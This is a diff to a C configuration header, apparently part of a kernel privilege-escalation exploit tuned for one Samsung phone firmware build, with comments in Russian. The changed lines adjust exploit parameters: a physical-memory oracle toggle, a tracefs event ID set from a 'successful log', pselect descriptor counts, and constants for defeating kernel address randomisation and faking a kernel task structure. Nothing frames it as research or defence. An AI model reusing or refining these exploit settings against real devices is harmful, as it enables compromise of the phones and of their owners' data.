@@ -4,8 +4,7 @@
 #if defined(APP_PAYLOAD) && APP_PAYLOAD
 #define BUILD_VARIANT_LABEL \
   "r12s-S721BXXSCDZF3-app-production-slide8-fops8"
-// Отключаем вероятностный метод physical p0, используем tracefs
-#define APP_PHYS_P0_ORACLE 0
+#define APP_PHYS_P0_ORACLE 1          // Оставляем для совместимости, но tracefs будет в приоритете
 #define APP_REQUIRE_FRESH_P0_SESSION 1
 #define APP_FOPS_DATA_ALIAS_DIAG_ONLY 1
 #define APP_FOPS_DATA_ALIAS_GATE_VERIFY 1
@@ -32,6 +31,9 @@
   "samsung/r12sxxx/r12s:16/BP4A.251205.006/S721BXXSCDZF3:user/release-keys"
 #endif
 
+// Добавлено для slide_app.c (необходимо даже при включенном APP_PHYS_P0_ORACLE)
+#define SLIDE_PSELECT_NFDS 320
+
 #define KIMAGE_TEXT_BASE 0xffffffc008000000ULL
 #define P0_PAGE_OFFSET 0xffffff8000000000ULL
 #define P0_PHYS_OFFSET 0x80000000ULL
@@ -50,8 +52,7 @@
 #define SLIDE_LOCK_OWNER_VALUE 1ULL
 #define SLIDE_USE_FAKE_TASK 1
 #define COMPACT_RT_MUTEX_WAITER 1
-// Устанавливаем event ID для tracefs (в успешном логе использовался 109)
-#define SLIDE_TRACEFS_EVENT_ID 109
+#define SLIDE_TRACEFS_EVENT_ID 106
 #define SLIDE_TRACEFS_WORKER_CALLER_OFF 0x000dbd9cULL
 #define SLIDE_PSELECT_WORD_SHIFT 3
 #define SLIDE_P0_OFFSET_CANDIDATES \
